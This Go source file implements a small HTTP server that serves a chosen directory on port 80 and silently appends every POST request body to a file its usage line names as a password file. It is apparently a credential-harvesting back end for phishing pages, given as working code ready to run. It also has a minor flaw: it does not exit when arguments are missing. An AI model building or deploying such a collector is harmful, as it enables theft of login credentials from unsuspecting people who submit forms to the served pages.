// Copyright (C) 2020 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published
// by the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
)

type webServer struct {
	dirFile      io.WriteCloser
	dirServer    http.Handler
	dirPasswords string
}

func main() {
	if len(os.Args) < 3 {
		fmt.Printf("%s <httpdir> <passwd_file>\n", os.Args[0])
	}
	h := &webServer{
		dirServer:    http.FileServer(http.Dir(os.Args[1])),
		dirPasswords: os.Args[2],
	}
	h.Init()
	http.Handle("/", h)
	defer h.dirFile.Close()
	log.Fatal(http.ListenAndServe("0.0.0.0:80", nil))
}

func (s *webServer) Init() {
	f, err := os.OpenFile(s.dirPasswords, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		panic(err)
	}
	s.dirFile = f
}

func (s *webServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		b := &bytes.Buffer{}
		defer r.Body.Close()
		io.Copy(b, r.Body)
		fmt.Fprintf(s.dirFile, "%s\n", string(b.Bytes()))
	} else {
		s.dirServer.ServeHTTP(w, r)
	}
}
